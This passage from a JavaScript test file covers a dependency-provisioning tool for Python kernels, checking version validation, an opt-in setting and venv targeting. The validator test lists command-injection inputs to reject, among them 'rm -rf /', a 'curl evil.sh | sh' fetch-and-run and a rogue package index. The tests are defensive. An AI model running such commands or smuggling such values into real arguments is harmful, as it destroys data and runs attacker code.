    delete require.cache[require.resolve("../dist/index.js")];
  }
});

function successResult() {
  return {
    output: "ok",
    images: undefined,
    details: {
      nestedToolCalls: 0,
      nestedToolNames: [],
      nestedResultChars: 0,
      nestedResultCount: 0,
      nestedErrors: 0,
      durationMs: 1,
      estimatedAvoidedTokens: 0,
    },
  };
}
test("isValidPythonVersion accepts plain versions and rejects injection attempts", async () => {
  const { isValidPythonVersion } = require("../dist/utils.js");
  // Leading/trailing whitespace is trimmed before matching (harmless; the
  // trimmed value must still match the strict pattern).
  for (const ok of ["3.14", "3.14.4", "3.15.0b1", "3.14.0rc2", "3.13.1a3", " 3.12 ", " 3.14 "]) {
    assert.equal(isValidPythonVersion(ok), true, `expected accept: ${ok}`);
  }
  for (const bad of [ // (trimmed whitespace is accepted by design; nothing else is)
    "3.14 --allow-insecure-host my-malware-site.com",
    "3.14; rm -rf /",
    "3.14 && curl evil.sh | sh",
    "3.14 --index-url http://evil",
    "python3", "3", "v3.14", "3.14.4.1", "3.14.x", "",
    "3.14.4+mypatch", "3.14.4.post1", "$(echo 3.14)", "3.14 # comment",
  ]) {
    assert.equal(isValidPythonVersion(bad), false, `expected reject: ${JSON.stringify(bad)}`);
  }
});

test("subagentsProvisioningEnabled: opt-in via PI_SUBAGENTS_MAX_CONCURRENT", async () => {
  const { subagentsProvisioningEnabled } = require("../dist/utils.js");
  const original = process.env.PI_SUBAGENTS_MAX_CONCURRENT;
  try {
    delete process.env.PI_SUBAGENTS_MAX_CONCURRENT;
    assert.equal(subagentsProvisioningEnabled(), false, "unset = disabled");
    process.env.PI_SUBAGENTS_MAX_CONCURRENT = "-1";
    assert.equal(subagentsProvisioningEnabled(), false, "-1 = disabled");
    process.env.PI_SUBAGENTS_MAX_CONCURRENT = "0";
    assert.equal(subagentsProvisioningEnabled(), false, "0 = disabled");
    process.env.PI_SUBAGENTS_MAX_CONCURRENT = "banana";
    assert.equal(subagentsProvisioningEnabled(), false, "garbage = disabled");
    process.env.PI_SUBAGENTS_MAX_CONCURRENT = "4";
    assert.equal(subagentsProvisioningEnabled(), true, "positive int = enabled");
    process.env.PI_SUBAGENTS_MAX_CONCURRENT = "8";
    assert.equal(subagentsProvisioningEnabled(), true, "positive int = enabled");
  } finally {
    if (original === undefined) delete process.env.PI_SUBAGENTS_MAX_CONCURRENT;
    else process.env.PI_SUBAGENTS_MAX_CONCURRENT = original;
  }
});

test("provision_dependency targets the requested kernel's venv and bootstraps pi_subagents into pinned envs", async () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "ptc-provision-"));
  const binDir = path.join(tmp, "bin");
  const logFile = path.join(tmp, "uv-calls.log");
  fs.mkdirSync(binDir);
  fs.writeFileSync(
    path.join(binDir, "uv"),
    '#!/bin/sh\necho "ARGV: $@" >> "' + logFile + '"\necho "Installed 1 package"\n',
  );
  fs.chmodSync(path.join(binDir, "uv"), 0o755);
  // fixture: a pi_subagents source dir the pinned bootstrap can install from
  const subagentsSource = path.join(tmp, "subagents-src", "main");
  fs.mkdirSync(subagentsSource, { recursive: true });
  fs.writeFileSync(path.join(subagentsSource, "pyproject.toml"), "[project]\nname='pi-subagents'\n");

  const previousPath = process.env.PATH;
  const previousSource = process.env.PTC_SUBAGENTS_SOURCE;
  process.env.PATH = binDir + path.delimiter + previousPath;
  process.env.PTC_SUBAGENTS_SOURCE = path.join(tmp, "subagents-src");

  const sharedPython = "/shared/venv/python";
  const pinnedPython = "/pinned/venv/python";
  const sandbox = { resolvePythonExecutable() { return sharedPython; } };
  const restore = restoreInjectedModules(sandbox);
  const { provisionDependencyTool } = require("../dist/index.js");

  try {
    // unknown session id → error listing live sessions
    const unknownManager = {
      get: () => false,
      list: () => [{ id: "live-1" }],
      getPythonExecutable: () => undefined,
    };
    const unknown = await provisionDependencyTool(unknownManager, sandbox)
      .execute("t", { package: "numpy", session_id: "nope" }, undefined);
    assert.match(unknown.content[0].text, /Unknown python session: nope/);
    assert.match(unknown.content[0].text, /live-1/);

    // pinned kernel → installs into the pinned venv AND bootstraps pi_subagents
    const pinnedManager = {
      get: (id) => id === "k1",
      list: () => [{ id: "k1" }],
      getPythonExecutable: (id) => (id === "k1" ? pinnedPython : undefined),
    };
    const pinned = await provisionDependencyTool(pinnedManager, sandbox)
      .execute("t", { package: "numpy", session_id: "k1" }, undefined);
    assert.match(pinned.content[0].text, /pinned venv/);
    assert.match(pinned.content[0].text, /pi_subagents bootstrapped/);

    // unpinned kernel → shared python, no pi_subagents bootstrap
    fs.rmSync(logFile, { force: true });
    const sharedManager = {
      get: (id) => id === "k2",
      list: () => [{ id: "k2" }],
      getPythonExecutable: () => undefined,
    };
    const shared = await provisionDependencyTool(sharedManager, sandbox)
      .execute("t", { package: "numpy", session_id: "k2" }, undefined);
    assert.match(shared.content[0].text, /shared environment/);
    assert.doesNotMatch(shared.content[0].text, /pi_subagents bootstrapped/);

    // no session_id → most recently used kernel's env
    fs.rmSync(logFile, { force: true });
    await provisionDependencyTool(pinnedManager, sandbox).execute("t", { package: "numpy" }, undefined);
    const logged = fs.readFileSync(logFile, "utf8");
    assert.match(logged, new RegExp(`--python ${pinnedPython.replace(/\//g, "\\/")} numpy`));
    assert.match(logged, /--editable/);
    const pinnedCalls = (logged.match(new RegExp(`--python ${pinnedPython.replace(/\//g, "\\/")}`, "g")) || []).length;
    assert.equal(pinnedCalls, 2, "package + pi_subagents both target the pinned venv");
    assert.ok(!logged.includes(sharedPython), "shared python untouched for a pinned kernel");
  } finally {
    process.env.PATH = previousPath;
    if (previousSource === undefined) delete process.env.PTC_SUBAGENTS_SOURCE;
    else process.env.PTC_SUBAGENTS_SOURCE = previousSource;
    fs.rmSync(tmp, { recursive: true, force: true });
    delete require.cache[require.resolve("../dist/index.js")];
  }
});
